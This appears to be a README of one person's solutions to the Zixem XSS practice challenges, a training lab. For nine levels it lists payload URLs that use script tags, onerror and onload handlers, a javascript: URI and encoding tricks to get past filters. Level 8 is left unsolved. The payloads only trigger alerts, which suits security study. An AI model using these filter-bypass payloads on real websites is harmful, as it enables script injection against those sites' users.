# 🧨 Zixem XSS Challenges – Solutions

This repository contains my solutions for the [zixem_xss](https://zixem.altervista.org/XSS/) , a set of web-based labs focused on Cross-Site Scripting (XSS) exploitation techniques.

**level 1**
https://zixem.altervista.org/XSS/1.php?name=<script>alert(1337)</script>

**level 2**
https://zixem.altervista.org/XSS/2.php?name=<SCRIPT>alert(1337)</SCRIPT>

**level 3**
https://zixem.altervista.org/XSS/3.php?name=%0A <img src=w onerror=alert(1337)>

**level 4**
https://zixem.altervista.org/XSS/4.php?img=sw' onerror='alert(1337)

**level 5**
https://zixem.altervista.org/XSS/5.php?name=zxm&action=javascript:alert(1337);

**level 6**
https://www.zixem.altervista.org/XSS/6.php?name=\74img src=x onerror=alert(1337)&gt;

**level 7**
https://zixem.altervista.org/XSS/7.php?name=%253Csvg/onload=alert(1333)%253E

**level 8**
Sorry folks, I couldn't crack this level yet — still wrapping my head around it.If you’ve got this, feel free to share. I’ll update this once I figure it out.

**level 9**
https://zixem.altervista.org/XSS/9.php?name=<sVg/onload=confirm(1337)>

**level 10**
https://zixem.altervista.org/XSS/10.php?name=zxm');onerror=alert;throw1337;//
